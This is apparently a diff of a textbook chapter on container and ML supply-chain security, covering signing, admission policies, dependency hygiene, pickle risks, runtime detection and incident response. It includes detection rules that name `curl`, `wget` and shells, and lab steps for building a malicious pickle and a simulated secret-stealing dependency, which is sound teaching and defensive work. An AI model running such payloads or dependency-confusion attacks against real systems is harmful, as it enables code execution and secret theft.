+*Production Kubernetes*, Chapter 15 (*Software Supply Chain*), explains why early container signing was hard. Notary v1, also called Docker Content Trust and built on TUF, had two major operational pain points. Sigstore's cosign and Notary v2's notation solved both.
+
+1. The registry URL coupling problem. Notary v1 bound each signature to a Globally Unique Name, or GUN, that included the registry hostname, such as `registry-a.example.com/team/app`. Whenever an enterprise replicated or cached that same image digest across regional registries, edge pull-through caches or air-gapped mirrors, such as `registry-b.internal/team/app`, Notary v1 signatures broke because the URL changed. Cosign and notation avoid this. They sign the content-addressable image manifest digest (`@sha256:...`) and store the signatures as OCI 1.1 artifacts or referrers inside the registry itself. Signatures and SBOM attestations can then travel across mirrors and regional caches.
+
+2. Push-based versus pull-based deployment, with progressive traffic shifting. After an image passes build, CVE scanning with Clair or Trivy, signing and promotion to the approved registry, *Production Kubernetes* Chapter 15 recommends pull-based GitOps controllers such as Flux or Argo CD over push-based CI scripts that run `kubectl apply`. CI then never holds cluster-admin credentials. Pair GitOps with a progressive delivery controller such as Flagger or Argo Rollouts. These shift traffic gradually, using Canary, Blue/Green or A/B Testing, through Ingress, the Gateway API or service mesh weights. They abort and roll back automatically if error rates or latency degrade.
 
 ### Signing at each stage of the pipeline
 
@@ -286,14 +337,14 @@ A signature is a cryptographic proof. The publisher hashes the image and ties th
 Notary is the main project in this area. Docker originally built it on The Update Framework (TUF), a system for distributing software updates securely. Teams have adopted signing slowly, for three reasons:
 
 - Notary has several components, including a server and multiple databases. Signing and verification sit on the deployment's critical path, so Notary needs high availability.
-- Notary names each image with a Globally Unique Name (GUN) that includes the registry URL. Signatures then cannot move to copies in caches or edge registries.
+- Notary names each image with a GUN that includes the registry URL. Signatures then cannot move to copies in caches or edge registries.
 - Notary and TUF use different key pairs, each with its own security needs. Rotating those keys after a breach is hard.
 
 At the time the book was written, a second version of Notary was in development. It aimed to simplify key management and to bundle signatures with the OCI images themselves. Several projects already run admission webhooks that check for signatures before a cluster runs an image.
 
 ### Admission-time enforcement in Kubernetes
 
-Enforce verification where workloads are admitted (5.21):
+Enforce verification where workloads are admitted (5.21). The Kyverno policy below does two things. Its first rule requires a keyless signature and a provenance attestation on images from the ML registry, for Pods in production namespaces. Its second rule allows images only from approved registries, for every Pod.
 
 ```yaml
 apiVersion: kyverno.io/v1
@@ -334,7 +385,11 @@ spec:
               - image: "registry.example.com/* | nvcr.io/*"
 ```
 
-Alternatives: **Sigstore policy-controller** (`ClusterImagePolicy`), **Ratify** (with Gatekeeper, Notation/cosign verifiers), **Connaisseur**, cloud-native **Binary Authorization** (GKE) / **ECR signing with Notation + Kyverno/Gatekeeper** / **Azure Policy for Kubernetes** with Notation. Operational concerns: verification latency (cache results), registry availability dependency (decide fail-open vs fail-closed), exemptions for system namespaces/bootstrap images (mirror them into your registry and sign), rolling out in `Audit` first, handling third-party images (re-sign after your own scanning/mirroring: "image promotion pipeline"), verifying **init containers and ephemeral containers**, and re-verification on Deployment updates.
+Read the first rule as a checklist. It checks the signature and the provenance attestation against the GitHub workflow identity, and it requires the build type to match. The second rule rejects images from any registry other than registry.example.com and nvcr.io.
+
+Other options include the Sigstore policy-controller with `ClusterImagePolicy`, Ratify with Gatekeeper, Connaisseur, and cloud-native services such as Binary Authorization on GKE, ECR signing with Notation and Kyverno or Gatekeeper, and Azure Policy for Kubernetes with Notation.
+
+Several operational concerns come with enforcement. Verification adds latency, so cache the results. Decide whether the webhook fails open or fails closed, because the registry becomes a dependency either way. Handle exemptions for system namespaces and bootstrap images by mirroring them into your registry and signing them. Roll the policy out in `Audit` mode first. Third-party images need re-signing after your own scanning and mirroring, which is the image promotion pipeline described below. Verify init containers and ephemeral containers, not only the main containers, and re-verify whenever a Deployment updates.
 
 ### Quarantine workflow
 
@@ -350,6 +405,8 @@ Combine this flow with admission controllers. Then only signed images, or images
 
 ### Image promotion pipeline
 
+The diagram shows an upstream image moving from quarantine into the approved repository.
+
 ```mermaid
 flowchart LR
   UP["Upstream image (NGC / community)"] --> MIR["Mirror into 'quarantine' repo by digest"]
@@ -361,15 +418,17 @@ flowchart LR
   PROD --> ADM["Admission verifies your signature only"]
 ```
 
-Clusters trust only the `approved` repository and your signer; upstream trust decisions are made once, centrally, with evidence.
+Clusters trust only the `approved` repository and your signer. Upstream trust decisions are made once, centrally, with evidence. Decide which signer and repository your clusters trust before you enable enforcement.
 
 ## 6. Registries and artefact stores
 
-- **Access control**: separate repos for quarantine/dev/prod; push rights only to CI identities; read-only for clusters (pull credentials via workload identity); no shared admin tokens; audit logs.
-- **Immutability**: tag immutability for release tags; digest references in manifests; retention to keep deployed digests available; deletion protections; replicated copies for DR.
-- **Scanning and policy in the registry** (Harbor policies: block pull of vulnerable images, require signed images), pull-through caches with allow-lists, rate limits and malware/quarantine features.
-- **Other artefact types**: Helm charts (OCI), Python packages (private PyPI/devpi/Artifactory with proxy and curation), conda channels, OS package mirrors (snapshots), model registries (MLflow/Hugging Face Hub private, OCI model artefacts via ORAS/KitOps), datasets (versioned buckets with hashes), Terraform modules/providers (mirrors, lock files with hashes, 4.22).
-- **Dependency confusion defences**: scoped/private package names, reserved names on public indexes, index priority configuration (`--index-url` only your proxy; `--extra-index-url` is dangerous), namespace claims; artefact curation (allow-list of approved packages/versions), delay new releases ("cooldown") before adoption.
+Your registry sits on the path to every deployment, so its access rules matter as much as the images in it. The points below cover access, immutability, scanning, other artefact types and dependency confusion.
+
+- Access control: keep separate repositories for quarantine, dev and prod. Push rights go only to CI identities, while clusters get read-only access through pull credentials from workload identity. Avoid shared admin tokens, and keep audit logs.
+- Immutability: turn on tag immutability for release tags, and reference digests in manifests. Keep retention long enough to make deployed digests available, add deletion protections, and keep replicated copies for disaster recovery.
+- Scanning and policy in the registry: Harbor policies, for example, can block pulls of vulnerable images and require signed images. Pull-through caches should use allow-lists. Rate limits and malware or quarantine features add further protection.
+- Other artefact types: registries hold more than container images. Helm charts can live as OCI artefacts. Python packages belong in a private index such as PyPI, devpi or Artifactory, with a proxy and curation. Conda channels and OS package mirrors (snapshots) work the same way. Model registries include private MLflow or Hugging Face Hub, and OCI model artefacts packaged with ORAS or KitOps. Datasets fit versioned buckets with hashes. Terraform modules and providers need mirrors and lock files with hashes (4.22).
+- Dependency confusion defences: use scoped or private package names, reserve names on public indexes and claim namespaces. Point the index at your proxy with `--index-url` only, because `--extra-index-url` is dangerous. Curate artefacts with an allow-list of approved packages and versions, and delay new releases with a cooldown before adoption.
 
 ### Registry placement and replication
 
@@ -379,52 +438,86 @@ Registry load grows with the number of developers. When thousands of teams build
 
 ## 7. Python and ML dependency hygiene
 
-- **Lockfiles with hashes**: `pip-compile --generate-hashes` / `uv pip compile --generate-hashes` / Poetry lock / PDM; install with `pip install --require-hashes -r requirements.txt` (`--no-deps` after a full lock) so any substituted wheel fails.
-- **Prefer wheels over sdists** (`--only-binary=:all:`) to avoid running arbitrary `setup.py` at install; for packages that need compilation (custom CUDA ops), build in a dedicated, hermetic, network-restricted stage and ship the wheel from your internal index.
-- **Private index as the only source** for CI and production images; mirror vetted public packages; automated scanning (`pip-audit`, OSV scanner, Safety) and licence checks; Renovate/Dependabot with review and a cool-down for fresh releases.
-- **Pinned CUDA/PyTorch stacks**: use vendor-published matched wheels/containers (NGC, PyTorch index with CUDA tag); avoid ad-hoc `pip install` in running containers/notebooks; image rebuild instead of mutation; restrict outbound access from training pods to package indexes except via a proxy.
-- **Notebook environments**: curated base images with approved libraries; per-user environments in volumes scanned regularly; disallow `pip install` from the Internet in production namespaces (egress policy), allow via proxy with allow-list; log installs.
-- **Conda/mamba**: pinned `conda-lock` files, trusted channels (conda-forge with signature verification), avoid mixed pip/conda drift.
-- **C/C++/CUDA extensions**: vendor and review; reproducible builds; compile with hardening flags; keep ABI/driver compatibility documented (5.1).
-- **Python startup attack surface**: `.pth` files, `sitecustomize`, `PYTHONSTARTUP`; read-only site-packages in production images; remove pip/compilers from runtime images.
-- **Inference servers**: patch quickly (public CVEs in popular servers like Ray, vLLM, Triton, Jupyter, MLflow, TorchServe have enabled RCE when exposed); never expose management ports; authenticate; network policies (5.15).
+Python dependencies are where many AI images get their risk. Each control below narrows what an installer can pull in and what it can run.
+
+Start with lockfiles that include hashes. Tools such as `pip-compile --generate-hashes`, `uv pip compile --generate-hashes`, a Poetry lock or PDM can produce them. Install with `pip install --require-hashes -r requirements.txt`, and add `--no-deps` after a full lock. Then any substituted wheel fails the install.
+
+Prefer wheels over sdists with `--only-binary=:all:`. That stops `pip` from running an arbitrary `setup.py` during install. Packages that must compile, such as custom CUDA ops, should build in a dedicated, hermetic, network-restricted stage. Ship the resulting wheel from your internal index.
+
+Make a private index the only source for CI and production images, and mirror vetted public packages into it. Scan with `pip-audit`, the OSV scanner or Safety, and run licence checks. Renovate or Dependabot should open update changes for review, with a cooldown for fresh releases.
+
+Pin CUDA and PyTorch stacks to matched wheels or containers that the vendor publishes, such as NGC or the PyTorch index with a CUDA tag. Avoid ad-hoc `pip install` in running containers and notebooks. Rebuild the image instead of mutating it. Restrict outbound access from training pods to package indexes, and allow that access only through a proxy.
+
+Notebook environments need the same discipline. Give users curated base images with approved libraries, and keep per-user environments in volumes that are scanned regularly. In production namespaces, use an egress policy to disallow `pip install` from the Internet. Allow installs through a proxy with an allow-list, and log them.
+
+For conda and mamba, use pinned `conda-lock` files and trusted channels, such as conda-forge with signature verification. Avoid drift between pip and conda installs.
+
+Vendor and review C, C++ and CUDA extensions. Build them reproducibly, compile with hardening flags, and document ABI and driver compatibility (5.1).
+
+Python has an attack surface at startup too. Watch `.pth` files, `sitecustomize` and `PYTHONSTARTUP`. Keep site-packages read-only in production images, and remove pip and compilers from runtime images.
+
+Inference servers need fast patching. Public CVEs in popular servers, including Ray, vLLM, Triton, Jupyter, MLflow and TorchServe, have enabled remote code execution (RCE) once the servers were exposed. Never expose management ports, authenticate every endpoint, and apply network policies (5.15).
+
+Before you add scanning, lock your dependencies and point every install at one index.
 
 ## 8. Model and data supply chain
 
-- **Serialization safety**: Python pickle (`torch.load` default pre-2.6, many `.bin`/`.pt`/`.pkl` checkpoints) executes arbitrary code on load. Use **safetensors** (no code execution, zero-copy), `torch.load(weights_only=True)`, ONNX/TensorRT engines from trusted builds, and avoid `trust_remote_code=True` with unreviewed model repositories (it downloads and runs Python from the model repo). Scan model files (ProtectAI `modelscan`, `fickling`, Hugging Face scanners) as defence in depth, not as proof of safety.
-- **Provenance & integrity**: record model source (repo, commit SHA), file hashes (SHA-256), licence, training data lineage, and evaluation results; **sign models** (OpenSSF model-signing with Sigstore; cosign for OCI model artefacts via ORAS/KitOps/ModelPack); verify on download and before serving; store approved models in an internal registry; pin by commit/digest, not "main".
-- **Download hygiene**: from allow-listed hubs through a proxy/mirror; checksum verification; no runtime downloads in production pods (pre-stage to PVC/object storage/image volume); deny egress to model hubs from serving namespaces.
-- **Datasets**: content-addressed/versioned storage (DVC, lakeFS, object versioning with checksums), access control and audit, validation of external data (schema, outlier and poisoning checks, deduplication, licence/PII scanning), reproducible snapshots for each training run (data hashes in run metadata), separation of raw vs curated zones.
-- **Fine-tuning and adapters**: LoRA adapters are small but can alter behaviour; sign and review; restrict who can promote adapters to production serving.
-- **Training pipeline integrity**: pipelines as code with reviews; artifact lineage (MLflow, W&B, OpenLineage); reproducible environments (image digest + lockfile + data hash + config + seed = run ID); protect experiment trackers and registries with RBAC; guardrails against tampering with evaluation sets.
-- **Output side**: model cards, SBOM/ML-BOM, evaluation attestations (safety/bias/performance gates as signed attestations enforced before promotion), watermark/provenance (C2PA) for generated content where relevant.
-- **Secrets in model artefacts**: scan checkpoints/notebooks/logs for credentials; avoid embedding tokens.
+A model file is code in disguise, and if you load a checkpoint you did not create, the first risk is how it is serialized. Python pickle is used by many `.bin`, `.pt` and `.pkl` checkpoints, and pickle executes arbitrary code on load. Before version 2.6, `torch.load` used pickle by default.
+
+Prefer safetensors, which runs no code and supports zero-copy loading. Pass `torch.load(weights_only=True)`, and use ONNX or TensorRT engines from trusted builds. Avoid `trust_remote_code=True` with unreviewed model repositories, because it downloads and runs Python from the model repo. Model scanners such as ProtectAI's modelscan, fickling and Hugging Face's scanners add defence in depth. They do not prove that a file is safe.
+
+Record where each model came from, so you can check it later. Capture the repo, the commit SHA, file hashes (SHA-256), the licence, the training data lineage and the evaluation results. Sign models with OpenSSF model-signing and Sigstore, or with cosign for OCI model artefacts packaged by ORAS, KitOps or ModelPack. Verify on download and again before serving. Store approved models in an internal registry, and pin them by commit or digest rather than by a moving name such as `main`.
+
+Download only from allow-listed hubs, through a proxy or mirror, and check checksums. Do not download at runtime in production pods. Pre-stage models onto a PVC, into object storage or into an image volume. Deny egress to model hubs from serving namespaces.
+
+Version datasets in content-addressed storage, such as DVC, lakeFS or object versioning with checksums. Control access and keep an audit trail. Validate external data for schema, outliers, poisoning, duplicates, licence and PII. Snapshot the data for each training run, with its hashes in the run metadata, and keep raw data separate from curated data.
+
+LoRA adapters are small, but they can change model behaviour. Sign and review them, and restrict who can promote adapters into production serving.
+
+Keep training pipelines as code, with reviews. Track artefact lineage with MLflow, W&B or OpenLineage. A reproducible run needs the image digest, lockfile, data hash, config and seed, and together those form the run ID. Protect experiment trackers and registries with RBAC, and guard evaluation sets against tampering.
+
+On the output side, publish model cards and an SBOM or ML-BOM. Evaluation attestations can act as signed safety, bias and performance gates that must pass before promotion. Watermarks or C2PA provenance can mark generated content where that matters.
+
+Scan checkpoints, notebooks and logs for credentials, and keep tokens out of model artefacts.
+
+Verify a model's source and hashes before anything loads it.
 
 ## 9. Runtime and detection
 
-Supply-chain controls fail eventually; limit the blast radius (5.15, 5.21):
+Supply-chain controls fail eventually, so you need to limit the blast radius (5.15, 5.21). Start with least privilege at runtime. Run as non-root, use a read-only root filesystem, drop capabilities, apply seccomp, and avoid host namespaces. Give the workload a minimal ServiceAccount, and grant cloud credentials only through workload identity with narrow scopes.
 
-- **Least privilege at runtime**: non-root, read-only rootfs, drop capabilities, seccomp, no host namespaces, minimal ServiceAccount, no cloud credentials unless workload identity with narrow scopes.
-- **Egress control**: default-deny egress with explicit allow-lists (object store, registry mirror, package proxy); blocks callbacks and exfiltration from compromised packages; DNS logging/FQDN policy.
-- **Runtime detection**: Falco/Tetragon rules for unexpected process execution (`curl`, `wget`, shells in prod images), writes to unexpected paths, connections to unfamiliar IPs, reading mounted secrets, loading unexpected kernel modules; audit logs for ServiceAccount token use anomalies.
-- **Node integrity**: signed/ measured boot where available, immutable node images (4.17), kernel module signing, restricting `privileged`; GPU driver containers/operators verified (signed images).
-- **Secrets hygiene**: short-lived credentials, workload identity, rotation, no long-lived keys in images.
-- **Honeytokens/canaries** in registries and buckets to detect scanning/theft.
+Default-deny egress, with explicit allow-lists for the object store, the registry mirror and the package proxy. This blocks callbacks and exfiltration from a compromised package. Log DNS, and use an FQDN policy where you can.
+
+Add runtime detection with Falco or Tetragon rules. Watch for unexpected process execution, such as `curl`, `wget` or shells in production images. Also watch for writes to unexpected paths, connections to unfamiliar IPs, reads of mounted secrets and loading of unexpected kernel modules. Audit logs can flag unusual ServiceAccount token use.
+
+Protect the node too. Use signed or measured boot where available, and immutable node images (4.17). Sign kernel modules, and restrict `privileged`. Verify GPU driver containers and operators by checking that their images are signed.
+
+Keep secrets short-lived. Use short-lived credentials, workload identity and rotation, and keep long-lived keys out of images. Place honeytokens, or canaries, in registries and buckets so that scanning or theft shows up.
 
 ### Limit what a container can do
 
-Scanning finds known flaws, but it cannot find everything. An image can download malicious content after deployment, and a running app can be hijacked. A naive guard is a periodic filesystem scan of running containers, to catch vulnerable binaries that arrive late. A stronger guard limits the actions and behaviors a container can perform. That ends the endless chase of CVEs, and it focuses on the capabilities the app should have. Runtime scanning is a large topic. Look at Falco and the Aqua Security suite as starting points.
+Scanning finds known flaws, but it cannot find everything. An image can download malicious content after deployment, and a running app can be hijacked. A naive guard is a periodic filesystem scan of running containers, to catch vulnerable binaries that arrive late. A stronger guard limits the actions and behaviours a container can perform. That ends the endless chase of CVEs, and it focuses on the capabilities the app should have.
+
+Runtime scanning is a large topic. Falco and the Aqua Security suite are good starting points.
+
+Decide which capabilities your workloads really need, and remove the rest. If you can name those capabilities, you can see what a compromised container could still do.
 
 ## 10. Incident response for supply-chain events
 
-1. **Identify scope** from SBOMs/inventory: which images/digests contain the affected component or came from the compromised pipeline; which clusters/namespaces run them (`kubectl` image digest inventory, GUAC/Dependency-Track queries); which models/datasets were built or touched.
-2. **Contain**: block the digests (admission deny list / policy exception removal), scale down or isolate affected workloads, disable affected CI pipelines/tokens, revoke signing identities or add to a revocation/deny list (cosign has no revocation; rely on policy by identity+time, or rotate keys and update policies), quarantine registry repositories.
-3. **Eradicate & rebuild**: rotate all credentials the build/runtime could have touched (CI tokens, cloud keys, registry creds, secrets), rebuild from known-good sources and bases with patched dependencies, verify provenance, redeploy progressively; scan nodes for persistence if container escape is suspected.
-4. **Investigate**: audit logs (CI, registry, Kubernetes API, cloud), Rekor entries, network egress logs, runtime detections; preserve evidence.
-5. **Communicate & learn**: notify stakeholders/customers per policy; blameless review; add detection and controls (e.g., enforce signature policy, cooldown for new dependencies, hermetic builds).
-6. **Prepare in peacetime**: maintain an up-to-date inventory, practise "log4shell drills" (find every instance of component X in 1 hour), keep rebuild pipelines healthy, document break-glass procedures.
+Suppose a CI token leaks and malicious images are pushed under your name. The playbook has six steps, and the first one is a query, not a guess.
+
+1. Identify the scope from SBOMs and inventory. Find which images and digests contain the affected component, or came from the compromised pipeline. Find which clusters and namespaces run them, using a `kubectl` image digest inventory or GUAC or Dependency-Track queries. Also find which models and datasets were built or touched.
+2. Contain the damage. Block the digests with an admission deny list, or remove the policy exception that let them through. Scale down or isolate affected workloads, and disable affected CI pipelines and tokens. Revoke signing identities or add them to a revocation or deny list. Cosign has no revocation, so rely on policy by identity and time, or rotate keys and update policies. Quarantine registry repositories as needed.
+3. Eradicate and rebuild. Rotate all credentials the build or runtime could have touched, including CI tokens, cloud keys, registry credentials and secrets. Rebuild from known-good sources and bases with patched dependencies. Verify provenance, and redeploy progressively. If container escape is suspected, scan nodes for persistence.
+4. Investigate. Review audit logs from CI, the registry, the Kubernetes API and the cloud. Check Rekor entries, network egress logs and runtime detections. Preserve the evidence.
+5. Communicate and learn. Notify stakeholders and customers according to policy. Run a blameless review, then add detection and controls, such as enforcing signature policy, a cooldown for new dependencies or hermetic builds.
+6. Prepare in peacetime. Keep an up-to-date inventory, and practise "log4shell drills", which find every instance of a component in 1 hour. Keep rebuild pipelines healthy, and document break-glass procedures.
+
+Build the inventory before an incident, because scoping without one is slow.
 
 ## 11. Maturity roadmap
+
+Few teams build all of this on day one. The table sorts the controls into four stages, from Baseline to Advanced, so you can see what comes next.
 
 | Stage | Capabilities |
 |---|---|
@@ -433,228 +526,236 @@ Scanning finds known flaws, but it cannot find everything. An image can download
 | **Verified** | SLSA L2–3 provenance; admission enforces signature + provenance; image promotion pipeline; VEX-driven triage; hermetic builds; egress allow-lists; signed models |
 | **Advanced** | Reproducible builds; policy on source reviews and dependency ages; GUAC/graph-based queries; runtime attestation (confidential computing/attested nodes); continuous verification and automated revocation; supplier attestation requirements |
 
+Use the table to decide which stage your team is working towards next.
+
 ## 12. Lab
 
-First, run the self-checking Python lab (`code/part05/supply_chain_policy_verifier_lab.py`) locally. It verifies the Sigstore/Cosign keyless OIDC signature and SLSA provenance verifier with `mutateDigest` (`verify_image_signature_and_mutate_digest`), the `PK` Chapter 15 quarantine-to-approved registry promotion and VEX CVE suppression engine (`evaluate_quarantine_image_promotion`), and the AI model (`safetensors` vs pickle) and Python `--require-hashes` / dependency-confusion auditor (`audit_ml_model_and_pip_supply_chain`).
+Start with the self-checking Python lab, which runs locally. It checks three things. It verifies a keyless Sigstore and Cosign OIDC signature, plus a SLSA provenance check with `mutateDigest` (through `verify_image_signature_and_mutate_digest`). It tests the quarantine-to-approved registry promotion and the VEX CVE suppression engine from Production Kubernetes, Chapter 15 (through `evaluate_quarantine_image_promotion`). It also audits the AI model format, `safetensors` against pickle, and the Python `--require-hashes` and dependency-confusion checks (through `audit_ml_model_and_pip_supply_chain`).
 
 ```bash
 python3 code/part05/supply_chain_policy_verifier_lab.py
 ```
 
-Next, on a cluster with BuildKit, `cosign`, `syft`, `trivy`/`grype`, and Kyverno (all interactive shell steps below are `untested here`), work through these exercises:
+Run the command above first, because you need its result before the cluster work. The cluster exercises come next. They need a cluster with BuildKit, `cosign`, `syft`, `trivy` or `grype`, and Kyverno. Every interactive shell step below is `untested here`, so treat those steps as a plan until you have run them.
 
-1. **Scan and SBOM**: build a PyTorch-based image; generate SPDX/CycloneDX SBOMs with Syft; scan with Trivy and Grype; compare findings; triage a CVE with VEX; show how a PyTorch-bundled CUDA library appears.
-2. **Hash-pinned Python**: create `requirements.in`, compile with hashes, install with `--require-hashes`; swap a wheel on a mirror to prove failure; configure a private index and demonstrate dependency confusion (in a sandbox) and the fix (single index, name reservation).
-3. **Keyless signing in CI**: GitHub Actions with OIDC: build, push, `cosign sign`, `cosign attest` SBOM and provenance; verify locally with identity constraints; inspect Rekor entry; tamper with the image tag and show verification failure.
-4. **Admission enforcement**: deploy Kyverno (or policy-controller) with verifyImages; start in Audit, review reports; switch to Enforce; test an unsigned image, a signed-by-wrong-identity image, and an allowed one; test init containers and Deployment updates.
-5. **SLSA provenance**: use the SLSA generator or BuildKit provenance; verify with `slsa-verifier`; add a policy condition on builder identity and source repo.
-6. **Promotion pipeline**: mirror an NGC/community image into quarantine, scan, sign, promote; make the cluster accept only the approved repo; update the image and re-run end-to-end; measure time.
-7. **Hermetic build**: build with BuildKit using an internal proxy and `--network=none` for the compile stage; show a build that tries to `curl` the Internet failing; compare reproducibility with `diffoscope`.
-8. **Model supply chain**: craft a malicious pickle (harmless payload) and show `torch.load` execution vs `weights_only=True` vs safetensors; scan with modelscan; sign a model artefact with model-signing/cosign and verify before serving in an init container; block `trust_remote_code` via policy.
-9. **Egress control**: run a "compromised dependency" simulation (a package that tries to call an external URL and read env/secrets); show default-deny egress NetworkPolicy and runtime detection (Falco/Tetragon) catching it; rotate the exposed secret.
-10. **Inventory & incident drill**: collect all running image digests and SBOMs into Dependency-Track/GUAC; answer "which workloads include package X version Y?" quickly; run a drill for a hypothetical critical CVE and measure time to inventory, patch, rebuild, redeploy.
-11. **CI hardening review**: audit a GitHub Actions workflow set: unpinned actions, `pull_request_target`, broad `GITHUB_TOKEN`, secrets exposure; fix using SHA pins, least-privilege permissions, environment protections, OIDC; run `zizmor`/`actionlint`/Scorecard.
-12. **Policy as code tests**: unit-test Kyverno policies with `kyverno test` and fixtures in CI (4.13).
-13. **Clean up**.
+1. Scan and SBOM. Build a PyTorch-based image. Generate SPDX and CycloneDX SBOMs with Syft, and scan with Trivy and Grype. Compare the findings, triage one CVE with VEX, and look for how a PyTorch-bundled CUDA library appears.
+2. Hash-pinned Python. Create `requirements.in`, and compile it with hashes. Install with `--require-hashes`, then swap a wheel on a mirror to prove that the install fails. Last, configure a private index and demonstrate dependency confusion in a sandbox. Then apply the fix, a single index with name reservation.
+3. Keyless signing in CI. Use GitHub Actions with OIDC to build and push an image, then run `cosign sign`. Attest the SBOM and the provenance with `cosign attest`. Verify locally with identity constraints, and inspect the Rekor entry. Finally, tamper with the image tag and confirm that verification fails.
+4. Admission enforcement. Deploy Kyverno, or the policy-controller, with `verifyImages`. Start in Audit mode and review the reports, then switch to Enforce. Test an unsigned image, an image signed by the wrong identity and an allowed image. Test init containers and Deployment updates too.
+5. SLSA provenance. Use the SLSA generator or BuildKit provenance. Verify it with `slsa-verifier`, then add a policy condition on the builder identity and the source repo.
+6. Promotion pipeline. Mirror an NGC or community image into quarantine, scan it, sign it and promote it. Make the cluster accept only the approved repo. Then update the image, run the whole flow end to end and measure the time.
+7. Hermetic build. Build with BuildKit, using an internal proxy and `--network=none` for the compile stage. Show that a build which tries to `curl` the Internet fails. Compare the reproducibility of two builds with `diffoscope`.
+8. Model supply chain. Craft a malicious pickle with a harmless payload. Show what happens with `torch.load`, with `weights_only=True` and with safetensors. Scan the file with modelscan. Sign a model artefact with model-signing or cosign, and verify it before serving in an init container. Then block `trust_remote_code` with a policy.
+9. Egress control. Run a compromised-dependency simulation, which is a package that tries to call an external URL and read environment variables and secrets. Show that a default-deny egress `NetworkPolicy` blocks it, and that Falco or Tetragon detects it. Then rotate the exposed secret.
+10. Inventory and incident drill. Collect all running image digests and SBOMs into Dependency-Track or GUAC. Answer "which workloads include package X version Y?" quickly. Then run a drill for a hypothetical critical CVE, and measure the time to inventory, patch, rebuild and redeploy.
+11. CI hardening review. Audit a GitHub Actions workflow set for unpinned actions, `pull_request_target`, a broad `GITHUB_TOKEN` and secrets exposure. Fix them with SHA pins, least-privilege permissions, environment protections and OIDC. Then run `zizmor`, `actionlint` and Scorecard.
+12. Policy as code tests. Unit-test your Kyverno policies with `kyverno test`, using fixtures in CI (4.13).
+13. Clean up when you finish.
 
 ## 13. Common mistakes
 
-- Scanning without acting; or blocking on every finding without context and getting policy disabled.
-- Signing tags or "trusting any valid signature" instead of binding to the expected identity and digest.
-- Leaving a fail-open admission webhook that can be bypassed under load; verifying only the main containers (not init/ephemeral).
-- Public indexes in production builds; `--extra-index-url`; no hashes; installing from the Internet at container start.
-- Pulling base images directly from public registries in prod builds; mutable tags; no rebuild cadence.
-- Treating SBOMs as compliance paperwork rather than an operational inventory; not storing them with digests.
-- Long-lived CI secrets and cluster credentials in CI; self-hosted runners with persistent state.
-- Loading pickled models from unknown sources; `trust_remote_code=True` by default; downloading models at runtime.
-- Ignoring GPU stack and inference-server CVEs; exposing management endpoints.
-- No inventory of what is running, so incident scoping takes days.
+Most of these mistakes come from a control that exists on paper but is set up badly in practice. Check your setup against each group.
+
+- Scanning without acting, or blocking on every finding without context until the policy gets disabled. Signing tags, or trusting any valid signature, instead of binding to the expected identity and digest.
+- A fail-open admission webhook can be bypassed under load. Verifying only the main containers, and not the init or ephemeral ones, is another gap. Public indexes in production builds, `--extra-index-url`, missing hashes and installs from the Internet at container start all add risk.
+- Base images pulled straight from public registries in production builds, mutable tags, and no rebuild cadence. Treating SBOMs as compliance paperwork instead of an operational inventory, and not storing them with digests.
+- Long-lived CI secrets and cluster credentials held in CI, and self-hosted runners with persistent state. Loading pickled models from unknown sources, leaving `trust_remote_code=True` on by default, and downloading models at runtime.
+- Ignoring GPU stack and inference-server CVEs, and exposing management endpoints. Having no inventory of what is running, so incident scoping takes days.
+
+Go through the list against your own pipeline, and fix the gap that would hurt most first.
 
 ## 14. Interview angles
 
-- "Walk me through securing the supply chain for container images in a Kubernetes cluster."
-- "What is SLSA? What are provenance and attestations? How do you verify them in the cluster?"
-- "How does cosign keyless signing work? What are Fulcio and Rekor?"
-- "What's in an SBOM and how do you use it during a Log4Shell-type event?"
-- "How do you defend against dependency confusion and typosquatting in Python?"
-- "Why are pickled models dangerous? What are the alternatives and controls?"
-- "How would you design an image promotion pipeline for third-party GPU images?"
-- "How do you respond if a CI token was leaked and malicious images were pushed?"
+Use these questions to practise explaining the chapter out loud.
+
+- Walk me through securing the supply chain for container images in a Kubernetes cluster.
+- What is SLSA? What are provenance and attestations? How do you verify them in the cluster?
+- How does cosign keyless signing work? What are Fulcio and Rekor?
+- What's in an SBOM and how do you use it during a Log4Shell-type event?
+- How do you defend against dependency confusion and typosquatting in Python?
+- Why are pickled models dangerous? What are the alternatives and controls?
+- How would you design an image promotion pipeline for third-party GPU images?
+- How do you respond if a CI token was leaked and malicious images were pushed?
+
+Pick the two you find hardest, and answer them in your own words.
 
 ## Exercises
 
-1. **The End-to-End AI Software Supply Chain Threat Model (`Source -> Build -> Dependencies -> Registry -> Deploy -> Runtime`):** Map the six attack vectors in Section 1 (`A1..A6`) to real-world supply-chain incidents (SolarWinds, Codecov, `xz`, dependency confusion, malicious pickle models, leaked CI tokens) and state the defensive control at each stage.
-2. **The Golden Base Images Antipattern, Cloud Native Buildpacks, and In-Cluster `Tekton` Build Pipelines (`PK` Chapter 15):** Using `evaluate_quarantine_image_promotion()` in `code/part05/supply_chain_policy_verifier.py`, explain why forcing teams to rebase all third-party/vendor images onto a single corporate OS base image fails (`PK` Ch. 15), how the Quarantine-to-Approved promotion pipeline replaces it, and trace the Tekton `git-clone` `Task`, `buildpacks-phases` `Task`, and `clone-and-buildpack` `Pipeline` manifests in Section 3.
-3. **`SLSA` Build Levels (`L1–L3`), `in-toto` Attestations, `SBOM`s (`SPDX`/`CycloneDX`), and `VEX`-Driven CVE Triage:** Explain the difference between SLSA Build L1, L2, and L3, how `Syft` generates SBOMs attached via `cosign attest --type spdxjson`, and how **VEX (`Vulnerability Exploitability eXchange`)** suppresses false-positive/un-exploitable CVE alerts with documented justification while blocking unmitigated fixable Critical/High CVEs.
-4. **Keyless Signing with `Sigstore` (`cosign`, `Fulcio`, `Rekor`), `Notary v1` `GUN` Limitations (`PK` Ch. 15), and Admission Enforcement (`Kyverno` `verifyImages`):** Using `verify_image_signature_and_mutate_digest()` in `code/part05/supply_chain_policy_verifier.py`, trace the `require-signed-images-and-provenance` Kyverno `ClusterPolicy` in Section 5, explaining how Fulcio binds a short-lived X.509 cert to the GitHub Actions OIDC token and logs it in Rekor, why Notary v1's Globally Unique Name (`GUN`) broke across registry mirrors (`PK` Ch. 15), and why `mutateDigest: true` is mandatory.
